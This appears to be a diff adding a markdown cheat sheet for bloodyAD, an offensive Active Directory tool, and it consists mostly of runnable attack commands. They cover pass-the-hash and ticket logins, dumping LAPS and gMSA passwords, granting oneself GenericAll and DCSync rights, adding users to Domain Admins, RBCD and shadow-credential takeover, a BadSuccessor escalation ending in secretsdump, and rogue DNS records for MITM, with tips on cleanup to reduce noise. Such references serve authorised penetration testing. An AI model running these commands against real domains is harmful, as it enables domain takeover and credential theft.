@@ -1,0 +1,416 @@
+# bloodyAD
+
+bloodyAD is a Python tool for interacting with Active Directory over LDAP(S). It covers enumeration, ACL abuse, delegation attacks, shadow credentials, and object manipulation, all through a consistent subcommand structure without requiring a Windows box.
+
+Install: `pip install bloodyAD` or clone from [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD).
+
+## Authentication
+
+bloodyAD supports multiple credential types on the same base command. Every command follows the pattern `bloodyAD [auth flags] -d DOMAIN --host DC [subcommand]`.
+
+```bash
+# Cleartext password
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST [cmd]
+
+# Pass-the-Hash (LMHASH:NTHASH format; use 0 for empty LM hash)
+bloodyAD -u $USER -p "00000000000000000000000000000000:$HASH" \
+  -d $DOMAIN --host $DC_HOST [cmd]
+
+# Pass-the-Ticket via ccache file
+bloodyAD -k ccache=/tmp/admin.ccache -d $DOMAIN --host $DC_HOST [cmd]
+
+# Certificate-based auth (key and cert from Certipy/pywhisker output)
+bloodyAD -c /tmp/priv.key:/tmp/cert.pem -d $DOMAIN --host $DC_HOST [cmd]
+
+# Force LDAPS (port 636); required when targeting read-only DCs or strict configs
+bloodyAD -s -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST [cmd]
+
+# Point to DC by IP when DNS does not resolve the hostname
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST -i $DC_IP [cmd]
+```
+
+## Enumeration
+
+The `get` and `msldap` subcommands cover the most useful recon paths. Start with `get writable` to immediately see what your current user can modify, then use `get object` to inspect specific targets.
+
+### Writable Objects
+
+`get writable` is the first command to run after gaining a foothold. It shows every AD object your current user has write access to, which directly maps to abuse paths.
+
+```bash
+# Find everything the current user can write to
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable
+
+# Scope to a specific object type
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype USER
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype COMPUTER
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype GROUP
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype OU
+
+# Filter by right type
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --right WRITE   # write access
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --right CHILD   # create/delete children
+
+# Show attribute-level detail: which specific attributes are writable per object
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype USER --detail
+```
+
+### Object Attributes
+
+`get object` reads LDAP attributes of any single AD object. Use it to inspect userAccountControl flags, retrieve LAPS passwords, gMSA secrets, or group membership before attempting abuse.
+
+```bash
+# Read all attributes of a user
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get object svc_backup
+
+# Read userAccountControl to check account flags (disabled, no-preauth, etc.)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get object $TARGET --attr userAccountControl
+
+# Read all members of a group
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get object "Domain Admins" --attr member
+
+# Retrieve LAPS plaintext password (requires read access to ms-Mcs-AdmPwd)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get object DC01$ --attr ms-Mcs-AdmPwd
+
+# Retrieve gMSA managed password blob (requires membership in PrincipalsAllowedToRetrieveManagedPassword)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get object 'gmsa_svc$' --attr msDS-ManagedPassword
+```
+
+### Membership and Hierarchy
+
+These commands help map group relationships and OU structure without needing BloodHound ingested.
+
+```bash
+# All groups a user belongs to (recursive by default)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get membership $TARGET
+
+# List all objects under an OU
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get children "OU=Servers,DC=$DOMAIN,DC=local"
+
+# Scope children to a specific object type
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get children "OU=Servers,DC=$DOMAIN,DC=local" --otype COMPUTER
+```
+
+### Raw LDAP Search
+
+`get search` issues a raw LDAP query. Use it when no built-in subcommand covers what you need.
+
+```bash
+# Find all users with a description set (often contains passwords)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get search --filter '(&(objectClass=user)(description=*))' --attr sAMAccountName,description
+
+# Find all enabled user accounts
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get search --filter '(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
+  --attr sAMAccountName
+```
+
+### DNS Records
+
+`get dnsDump` is useful for internal network mapping; it returns all DNS zone records the current user can read.
+
+```bash
+# Dump all DNS records from all zones
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get dnsDump
+
+# Scope to a single zone
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get dnsDump --zone $DOMAIN
+```
+
+### Trust Relationships
+
+```bash
+# Display domain trust tree
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get trusts
+```
+
+### Delegation Recon
+
+These `msldap` subcommands find delegation misconfigurations that feed into unconstrained, constrained, and RBCD attack chains.
+
+```bash
+# Find computers/users with unconstrained delegation (TrustedForDelegation flag)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap unconstrained
+
+# Find accounts with constrained delegation (msDS-AllowedToDelegateTo set)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap constrained
+
+# Find accounts that can act as proxy via S4U2Proxy
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap s4u2proxy
+```
+
+### Legacy and Service Accounts
+
+```bash
+# Pre-Windows 2000 machine accounts; often have predictable passwords (computer name lowercase)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap pre2000
+
+# List gMSA accounts and attempt to retrieve their passwords
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap gmsa
+
+# Find all accounts with SPNs set (Kerberoastable targets)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap spns
+
+# Find accounts with pre-auth disabled (AS-REP roastable targets)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap asrep
+```
+
+### LAPS
+
+```bash
+# List all LAPS-enabled computers and retrieve passwords if permitted
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap laps
+
+# Find which computers are LAPS targets (without attempting password retrieval)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap lapstarget
+```
+
+### BadSuccessor Check
+
+```bash
+# Check if the domain is vulnerable to the BadSuccessor (dMSA) privilege escalation
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
+```
+
+## ACL Abuse
+
+ACL abuse flows directly from `get writable` output. These `add`, `remove`, and `set` commands let you exploit the rights you discovered in enumeration.
+
+### GenericAll / Full Control
+
+Granting yourself GenericAll on an object gives complete control: you can change its password, modify its attributes, or add it to groups. Requires WriteDacl or ownership of the target.
+
+```bash
+# Grant your user GenericAll on a target user
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+
+# Remove after abuse to reduce noise
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  remove genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+```
+
+### Group Membership
+
+Adding yourself to a privileged group (e.g., Domain Admins, Backup Operators) is the fastest path to elevated access when you have GenericAll or WriteProperty on the group.
+
+```bash
+# Add a user to a group
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add groupMember "Domain Admins" $TARGET
+
+# Remove after abuse (clean up is important in real engagements)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  remove groupMember "Domain Admins" $TARGET
+```
+
+### Password Reset
+
+Exploits ForceChangePassword or GenericAll rights. No knowledge of the current password is required.
+
+```bash
+# Change target user's password
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set password $TARGET 'NewPassword123!'
+
+# Change a computer account's password (useful after gaining GenericAll on machine account)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set password 'WORKSTATION$' 'NewComputerPass123!'
+```
+
+### Ownership
+
+Taking ownership of an object lets you then grant yourself any rights via WriteDacl. Requires WriteOwner on the target.
+
+```bash
+# Set yourself as owner of a target object
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set owner $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+```
+
+### DCSync Rights
+
+DCSync requires the Replicating Directory Changes and Replicating Directory Changes All extended rights on the domain root. If you have WriteDacl on the domain object, you can grant yourself these.
+
+```bash
+# Grant DCSync rights to a user
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+
+# Remove after dumping NTDS
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  remove dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+```
+
+### Generic Attribute Write
+
+`set object` writes any writable LDAP attribute directly. Use it for targeted Kerberoasting by adding an SPN to a user, or to clear attributes after abuse.
+
+```bash
+# Add an SPN to a user account to make it Kerberoastable (requires GenericWrite or WriteProperty)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object $TARGET servicePrincipalName -v "fake/spn.$DOMAIN"
+
+# Clear the SPN after roasting the hash
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object $TARGET servicePrincipalName -v ''
+
+# Write any attribute by name and value
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object $TARGET description -v 'modified'
+```
+
+## Delegation Abuse
+
+RBCD abuse requires write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer. bloodyAD handles the attribute encoding automatically.
+
+```bash
+# Set RBCD: allow EVIL$ to impersonate any user to TARGET$
+# Requires GenericAll, GenericWrite, or WriteProperty on TARGET$
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add rbcd TARGET$ $COMP_NAME
+
+# Verify the attribute was written correctly
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get object TARGET$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity
+
+# After exploitation, clean up the attribute
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  remove rbcd TARGET$ $COMP_NAME
+```
+
+After setting RBCD, use `getST.py` to request the service ticket and then move laterally.
+
+```bash
+getST.py $DOMAIN/'$COMP_NAME':$COMP_PASS \
+  -spn cifs/TARGET.$DOMAIN \
+  -impersonate Administrator \
+  -dc-ip $DC_IP
+
+export KRB5CCNAME="Administrator@cifs_TARGET.$DOMAIN@${DOMAIN^^}.ccache"
+psexec.py -k -no-pass Administrator@TARGET.$DOMAIN
+```
+
+## Shadow Credentials
+
+Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute. Adding a Key Credential to a target account allows authentication as that account via PKINIT without knowing its password. Requires GenericAll or WriteProperty on the attribute.
+
+```bash
+# Add shadow credentials to a target user
+# bloodyAD generates the key pair and outputs the PEM files and NT hash automatically
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add shadowCredentials $TARGET
+
+# Add shadow credentials to a computer account (enables impersonation via RBCD chain)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add shadowCredentials 'TARGET$'
+
+# Remove a specific key credential by its DeviceID (shown in add output)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  remove shadowCredentials $TARGET --key <DeviceID>
+```
+
+The `add shadowCredentials` command outputs the certificate files and NT hash directly. If PKINIT is blocked, use `gettgtpkinit.py` or `Certipy auth` manually with the generated cert.
+
+## UAC Manipulation
+
+UAC flags control account behaviour: pre-auth requirements, password expiry, account status, and more. Setting or unsetting these flags requires GenericAll or WriteProperty on the account.
+
+```bash
+# Disable Kerberos pre-authentication on a user (makes it AS-REP roastable)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add uac $TARGET -f DONT_REQ_PREAUTH
+
+# Re-enable pre-authentication (clean up)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  remove uac $TARGET -f DONT_REQ_PREAUTH
+
+# Set password to never expire on a service account under your control
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add uac svc_account -f DONT_EXPIRE_PASSWORD
+
+# Check current flags after modification
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get object $TARGET --attr userAccountControl
+```
+
+## BadSuccessor (Windows Server 2025)
+
+BadSuccessor is a privilege escalation path affecting Windows Server 2025 domain controllers. An attacker with `CreateChild` rights on any OU can create a delegated Managed Service Account (dMSA) that inherits the privileges of any existing account, including Domain Admins.
+
+First confirm the vulnerability exists:
+
+```bash
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
+```
+
+If vulnerable, create a dMSA targeting a privileged account:
+
+```bash
+# Create a dMSA under an OU where you have CreateChild rights
+# -t specifies the principal account whose privileges the dMSA will inherit
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add badSuccessor evilDMSA \
+  --ou "OU=Workstations,DC=$DOMAIN,DC=local" \
+  -t "CN=Administrator,CN=Users,DC=$DOMAIN,DC=local"
+```
+
+Then authenticate as the dMSA to get a TGT carrying the inherited privileges:
+
+```bash
+# Get a TGT as the dMSA (password is the one you set during creation)
+getTGT.py $DOMAIN/evilDMSA:$COMP_PASS -dc-ip $DC_IP
+
+export KRB5CCNAME=evilDMSA.ccache
+
+# The TGT carries the target account's SIDs; access DCs directly
+secretsdump.py -k -no-pass $DOMAIN/evilDMSA@$DC_HOST
+```
+
+## Object Management
+
+These commands cover object creation, deletion, and DNS record manipulation. Computer account creation is commonly needed as a prerequisite for RBCD attacks when MachineAccountQuota is above 0.
+
+```bash
+# Create a new domain user
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add user newuser 'Password123!'
+
+# Create a computer account (alternative to addcomputer.py for RBCD prereq)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add computer '$COMP_NAME' $COMP_PASS
+
+# Delete any AD object by distinguished name
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  remove object "CN=$COMP_NAME,CN=Computers,DC=$DOMAIN,DC=local"
+
+# Add a DNS A record (useful for MITM or coercion attacks)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add dnsRecord attacker-host $LHOST
+
+# Remove a DNS record after use
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  remove dnsRecord attacker-host $LHOST
+```
+
+## Global Flags Reference
+
+| Flag | Purpose |
+|------|---------|
+| `-H` / `--host` | DC hostname or IP |
+| `-i` / `--dc-ip` | DC IP when hostname cannot resolve |
+| `-d` | Domain (e.g., `domain.local`) |
+| `-u` / `-p` | Username and password or `LMHASH:NTHASH` |
+| `-k` | Kerberos auth: `ccache=/path/to/file.ccache`, `kirbi=file.kirbi`, or `keytab=file.keytab` |
+| `-c` | Certificate auth: `/path/to/key:/path/to/cert` |
+| `-s` | Use LDAPS (port 636) |
+| `--gc` | Connect to Global Catalog (port 3268) for forest-wide queries |
+| `--json` | Output results as JSON |
+| `-v DEBUG` | Verbose output for troubleshooting LDAP errors |
